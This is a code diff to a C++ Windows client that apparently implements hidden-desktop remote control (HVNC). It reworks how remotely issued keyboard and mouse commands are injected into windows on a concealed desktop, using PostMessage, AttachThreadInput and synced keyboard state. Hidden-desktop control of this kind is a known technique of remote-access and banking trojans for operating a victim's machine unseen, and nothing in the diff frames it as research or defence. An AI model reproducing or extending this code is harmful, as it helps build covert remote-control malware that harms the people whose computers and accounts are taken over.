@@ -145,6 +145,7 @@ static LRESULT g_dragHitTest = HTCLIENT;
 static HWND  g_hLastWindow  = NULL;
 static HWND  g_hCurrentFocus = NULL;
 static HWND  g_mouseDownTarget[3] = { NULL, NULL, NULL };
+static bool  g_key_caps_down = false;
 static atomic_int g_staticFrameCount(0);
 static atomic_bool g_forceFullFrame(false);
 
@@ -769,56 +770,6 @@ static DWORD mouse_button_flag(int btn, bool down) {
     return down ? MOUSEEVENTF_LEFTDOWN : MOUSEEVENTF_LEFTUP;
 }
 
-static bool send_mouse_input(int normX, int normY, DWORD flags, DWORD mouseData = 0) {
-    INPUT input{};
-    input.type = INPUT_MOUSE;
-    input.mi.dx = normX;
-    input.mi.dy = normY;
-    input.mi.mouseData = mouseData;
-    input.mi.dwFlags = flags | MOUSEEVENTF_ABSOLUTE;
-    return SendInput(1, &input, sizeof(INPUT)) == 1;
-}
-
-static bool send_key_input(WORD vk, bool down) {
-    INPUT input{};
-    input.type = INPUT_KEYBOARD;
-    input.ki.wVk = vk;
-    input.ki.dwFlags = down ? 0 : KEYEVENTF_KEYUP;
-    return SendInput(1, &input, sizeof(INPUT)) == 1;
-}
-
-static bool send_unicode_input(WCHAR ch) {
-    INPUT inputs[2]{};
-    inputs[0].type = INPUT_KEYBOARD;
-    inputs[0].ki.wScan = ch;
-    inputs[0].ki.dwFlags = KEYEVENTF_UNICODE;
-    inputs[1].type = INPUT_KEYBOARD;
-    inputs[1].ki.wScan = ch;
-    inputs[1].ki.dwFlags = KEYEVENTF_UNICODE | KEYEVENTF_KEYUP;
-    return SendInput(2, inputs, sizeof(INPUT)) == 2;
-}
-
-static LPARAM key_lparam(WORD vk, bool keyUp) {
-    UINT scan = MapVirtualKeyW(vk, MAPVK_VK_TO_VSC);
-    LPARAM lp = 1 | (scan << 16);
-    if (keyUp) lp |= 0xC0000000;
-    return lp;
-}
-
-static void post_key_fallback(HWND hwnd, int vk, const string& action) {
-    if (!hwnd || !IsWindow(hwnd)) return;
-    client_log("keyboard fallback PostMessage action=" + action +
-               " vk=" + to_string(vk) +
-               " hwnd=" + to_string((uintptr_t)hwnd));
-    if (action == "hvnc_keydown") {
-        PostMessageW(hwnd, WM_KEYDOWN, (WPARAM)vk, key_lparam((WORD)vk, false));
-    } else if (action == "hvnc_keyup") {
-        PostMessageW(hwnd, WM_KEYUP, (WPARAM)vk, key_lparam((WORD)vk, true));
-    } else if (action == "hvnc_char") {
-        PostMessageW(hwnd, WM_CHAR, (WPARAM)vk, 1);
-    }
-}
-
 static POINT screen_pt(int normX, int normY) {
     int sw = GetSystemMetrics(SM_CXSCREEN);
     int sh = GetSystemMetrics(SM_CYSCREEN);
@@ -833,13 +784,6 @@ static UINT mouse_message_for_button(int btn, bool down, bool dblClick = false) 
     if (btn == 2) return down ? WM_MBUTTONDOWN : WM_MBUTTONUP;
     if (dblClick) return WM_LBUTTONDBLCLK;
     return down ? WM_LBUTTONDOWN : WM_LBUTTONUP;
-}
-
-static WPARAM mouse_wparam_for_button(int btn, bool down) {
-    if (!down) return 0;
-    if (btn == 1) return MK_RBUTTON;
-    if (btn == 2) return MK_MBUTTON;
-    return MK_LBUTTON;
 }
 
 static HWND resolve_child_window_from_point(HWND hwnd, POINT screenPt) {
@@ -871,15 +815,11 @@ static HWND target_window_from_screen_point(POINT screenPt) {
     return resolve_child_window_from_point(hwnd, screenPt);
 }
 
-static bool post_mouse_to_window(HWND hwnd, POINT screenPt, UINT msg, WPARAM wParam) {
-    if (!hwnd || !IsWindow(hwnd)) return false;
-
-    POINT clientPt = screenPt;
-    if (!ScreenToClient(hwnd, &clientPt)) return false;
-
-    LPARAM lParam = MAKELPARAM(clientPt.x, clientPt.y);
-    PostMessageW(hwnd, WM_MOUSEMOVE, 0, lParam);
-    return PostMessageW(hwnd, msg, wParam, lParam) != FALSE;
+static LPARAM key_lparam(WORD vk, bool keyUp) {
+    UINT scan = MapVirtualKeyW(vk, MAPVK_VK_TO_VSC);
+    LPARAM lp = 1 | (scan << 16);
+    if (keyUp) lp |= 0xC0000000;
+    return lp;
 }
 
 static void activate_target_window(HWND hTarget, UINT mouseMsg, LRESULT hitTest) {
@@ -915,6 +855,17 @@ static void activate_target_window(HWND hTarget, UINT mouseMsg, LRESULT hitTest)
     g_hCurrentFocus = hTarget;
 }
 
+static bool post_mouse_to_window(HWND hwnd, POINT screenPt, UINT msg, WPARAM wParam) {
+    if (!hwnd || !IsWindow(hwnd)) return false;
+
+    POINT clientPt = screenPt;
+    if (!ScreenToClient(hwnd, &clientPt)) return false;
+
+    LPARAM lParam = MAKELPARAM(clientPt.x, clientPt.y);
+    PostMessageW(hwnd, WM_MOUSEMOVE, 0, lParam);
+    return PostMessageW(hwnd, msg, wParam, lParam) != FALSE;
+}
+
 // -----------------------------------------------------------------------
 //  Yardımcı: Odaklanmış pencereyi bul (gizli desktop'ta)
 // -----------------------------------------------------------------------
@@ -931,6 +882,36 @@ static HWND GetFocusedWindow() {
         if (gti.hwndCaret) return gti.hwndCaret;
     }
     return hTarget;
+}
+
+static void sync_keyboard_state(DWORD targetThreadId, WORD vk, bool down, const string& action) {
+    BYTE kState[256];
+    if (!GetKeyboardState(kState)) return;
+
+    // Shift, Ctrl, Alt sync
+    kState[VK_SHIFT]   = (GetKeyState(VK_SHIFT)   & 0x8000) ? 0x80 : 0;
+    kState[VK_LSHIFT]  = (GetKeyState(VK_LSHIFT)  & 0x8000) ? 0x80 : 0;
+    kState[VK_RSHIFT]  = (GetKeyState(VK_RSHIFT)  & 0x8000) ? 0x80 : 0;
+    kState[VK_CONTROL] = (GetKeyState(VK_CONTROL) & 0x8000) ? 0x80 : 0;
+    kState[VK_LCONTROL]= (GetKeyState(VK_LCONTROL)& 0x8000) ? 0x80 : 0;
+    kState[VK_RCONTROL]= (GetKeyState(VK_RCONTROL)& 0x8000) ? 0x80 : 0;
+    kState[VK_MENU]    = (GetKeyState(VK_MENU)    & 0x8000) ? 0x80 : 0;
+    kState[VK_LMENU]   = (GetKeyState(VK_LMENU)   & 0x8000) ? 0x80 : 0;
+    kState[VK_RMENU]   = (GetKeyState(VK_RMENU)   & 0x8000) ? 0x80 : 0;
+
+    // Special handling for the actual key event
+    if (action == "hvnc_keydown") {
+        kState[vk] |= 0x80;
+        if (vk == VK_CAPITAL && !g_key_caps_down) {
+            kState[VK_CAPITAL] ^= 0x01;
+            g_key_caps_down = true;
+        }
+    } else if (action == "hvnc_keyup") {
+        kState[vk] &= ~0x80;
+        if (vk == VK_CAPITAL) g_key_caps_down = false;
+    }
+
+    SetKeyboardState(kState);
 }
 
 // -----------------------------------------------------------------------
@@ -957,27 +938,25 @@ static void input_loop() {
         // ---- Klavye ----
         if (action == "hvnc_keydown" || action == "hvnc_keyup" || action == "hvnc_char") {
             int vk = cmd.value("keycode", 0);
-            HWND hTarget = g_hCurrentFocus;
-            if (!hTarget || !IsWindow(hTarget)) hTarget = GetForegroundWindow();
+            HWND hTarget = GetFocusedWindow();
             if (!hTarget || !IsWindow(hTarget)) continue;
 
-            SetForegroundWindow(GetAncestor(hTarget, GA_ROOT));
+            DWORD targetThreadId = GetWindowThreadProcessId(hTarget, NULL);
+            DWORD currentThreadId = GetCurrentThreadId();
+
+            AttachThreadInput(currentThreadId, targetThreadId, TRUE);
+            sync_keyboard_state(targetThreadId, (WORD)vk, action != "hvnc_keyup", action);
             SetFocus(hTarget);
 
-            bool sendInputOk = false;
             if (action == "hvnc_keydown") {
-                sendInputOk = send_key_input((WORD)vk, true);
+                PostMessageW(hTarget, WM_KEYDOWN, (WPARAM)vk, key_lparam((WORD)vk, false));
             } else if (action == "hvnc_keyup") {
-                sendInputOk = send_key_input((WORD)vk, false);
+                PostMessageW(hTarget, WM_KEYUP, (WPARAM)vk, key_lparam((WORD)vk, true));
             } else if (action == "hvnc_char") {
-                sendInputOk = send_unicode_input((WCHAR)vk);
+                PostMessageW(hTarget, WM_CHAR, (WPARAM)vk, 1);
             }
-            if (!sendInputOk) {
-                client_log("SendInput failed action=" + action +
-                           " vk=" + to_string(vk) +
-                           " error=" + to_string(GetLastError()));
-            }
-            post_key_fallback(hTarget, vk, action);
+
+            AttachThreadInput(currentThreadId, targetThreadId, FALSE);
             g_forceFullFrame = true;
             continue;
         }
@@ -991,7 +970,6 @@ static void input_loop() {
 
         if (action == "hvnc_mousemove") {
             g_forceFullFrame = true;
-            send_mouse_input(normX, normY, MOUSEEVENTF_MOVE);
             if (g_dragging && g_dragHwnd) {
                 int dx = screenPt.x - g_dragStartPt.x;
                 int dy = screenPt.y - g_dragStartPt.y;
@@ -1075,8 +1053,6 @@ static void input_loop() {
                     }
                 }
 
-                send_mouse_input(normX, normY, MOUSEEVENTF_MOVE | mouse_button_flag(btn, true));
-
                 if (btn == 0 && (ht == HTCAPTION || ht == HTLEFT || ht == HTRIGHT ||
                                  ht == HTTOP || ht == HTBOTTOM || ht == HTTOPLEFT ||
                                  ht == HTTOPRIGHT || ht == HTBOTTOMLEFT || ht == HTBOTTOMRIGHT)) {
@@ -1091,11 +1067,8 @@ static void input_loop() {
                 if (!hTarget) hTarget = hwnd;
                 activate_target_window(hTarget, mouseMsg, ht);
                 g_hCurrentFocus = hTarget;
-                POINT clientPt = screenPt;
-                ScreenToClient(hTarget, &clientPt);
-
                 g_mouseDownTarget[btn] = hTarget;
-                post_mouse_to_window(hTarget, screenPt, mouseMsg, mouse_wparam_for_button(btn, true));
+                post_mouse_to_window(hTarget, screenPt, mouseMsg, (btn == 0 ? MK_LBUTTON : (btn == 1 ? MK_RBUTTON : MK_MBUTTON)));
             }
             continue;
         }
@@ -1109,26 +1082,12 @@ static void input_loop() {
                 g_dragHwnd  = NULL;
             }
 
-            HWND hwnd = WindowFromPoint(screenPt);
-            if (!hwnd) continue;
-
-            LRESULT ht = HTCLIENT;
-            SendMessageTimeoutW(hwnd, WM_NCHITTEST, 0, MAKELPARAM(screenPt.x, screenPt.y),
-                                SMTO_ABORTIFHUNG, 200, (PDWORD_PTR)&ht);
-
-            if (ht != HTCLIENT) {
-                send_mouse_input(normX, normY, MOUSEEVENTF_MOVE | mouse_button_flag(btn, false));
-            } else {
-                HWND hTarget = g_mouseDownTarget[btn];
-                if (!hTarget || !IsWindow(hTarget)) hTarget = target_window_from_screen_point(screenPt);
-                if (!hTarget) hTarget = hwnd;
-
-                POINT clientPt = screenPt;
-                ScreenToClient(hTarget, &clientPt);
-
-                post_mouse_to_window(hTarget, screenPt, mouse_message_for_button(btn, false), mouse_wparam_for_button(btn, false));
-                g_mouseDownTarget[btn] = NULL;
+            HWND hTarget = g_mouseDownTarget[btn];
+            if (!hTarget || !IsWindow(hTarget)) hTarget = target_window_from_screen_point(screenPt);
+            if (hTarget) {
+                post_mouse_to_window(hTarget, screenPt, mouse_message_for_button(btn, false), 0);
             }
+            g_mouseDownTarget[btn] = NULL;
             continue;
         }
 
@@ -1147,17 +1106,17 @@ static void input_loop() {
                 HWND hTarget = target_window_from_screen_point(screenPt);
                 if (!hTarget) hTarget = hwnd;
                 activate_target_window(hTarget, mouse_message_for_button(btn, true, btn == 0), ht);
-
-                POINT clientPt = screenPt;
-                ScreenToClient(hTarget, &clientPt);
+                g_hCurrentFocus = hTarget;
 
                 UINT downMsg = mouse_message_for_button(btn, true);
                 UINT upMsg = mouse_message_for_button(btn, false);
                 UINT dblMsg = mouse_message_for_button(btn, true, btn == 0);
-                post_mouse_to_window(hTarget, screenPt, downMsg, mouse_wparam_for_button(btn, true));
-                post_mouse_to_window(hTarget, screenPt, upMsg, mouse_wparam_for_button(btn, false));
-                post_mouse_to_window(hTarget, screenPt, dblMsg, mouse_wparam_for_button(btn, true));
-                post_mouse_to_window(hTarget, screenPt, upMsg, mouse_wparam_for_button(btn, false));
+                WPARAM mk = (btn == 0 ? MK_LBUTTON : (btn == 1 ? MK_RBUTTON : MK_MBUTTON));
+
+                post_mouse_to_window(hTarget, screenPt, downMsg, mk);
+                post_mouse_to_window(hTarget, screenPt, upMsg, 0);
+                post_mouse_to_window(hTarget, screenPt, dblMsg, mk);
+                post_mouse_to_window(hTarget, screenPt, upMsg, 0);
             }
             continue;
         }
